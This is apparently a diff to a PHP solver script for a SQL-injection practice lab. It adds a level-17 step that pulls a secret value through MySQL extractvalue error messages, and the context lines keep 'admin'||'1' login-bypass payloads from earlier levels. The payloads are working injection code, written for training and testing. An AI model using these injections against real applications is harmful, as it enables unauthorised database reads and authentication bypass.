@@ -111,5 +111,22 @@ check(15, post("$base/level15.php", ['username' => "admin'||'1", 'password' => '
 /* 16 - five layers, none of them covering the pipe */
 check(16, post("$base/level16.php", ['username' => "admin'||'1", 'password' => 'x']), 'pipe as OR');
 
+/* 17 - error-based extraction: no row is printed, so read the error instead */
+$hexKey = '0x' . bin2hex('secret_message');
+$parts  = [];
+foreach ([[1, 31], [32, 31]] as [$from, $len]) {
+    $body = post("$base/level17.php", [
+        'order_id' => "1 AND extractvalue(1,concat(0x7e,(SELECT substring(mvalue,$from,$len) "
+                    . "FROM meta WHERE mkey=$hexKey)))",
+    ]);
+    if (preg_match('/XPATH syntax error: &#039;~(.*?)&#039;/', $body, $m)
+        || preg_match("/XPATH syntax error: '~(.*?)'/", $body, $m)) {
+        $parts[] = html_entity_decode($m[1], ENT_QUOTES, 'UTF-8');
+    }
+}
+$recovered = implode('', $parts);
+check(17, post("$base/level17.php", ['recovered' => $recovered]),
+    strlen($recovered) . ' chars read in ' . count($parts) . ' errors');
+
 echo "------------------\n$pass passed, $fail failed\n";
 exit($fail === 0 ? 0 : 1);
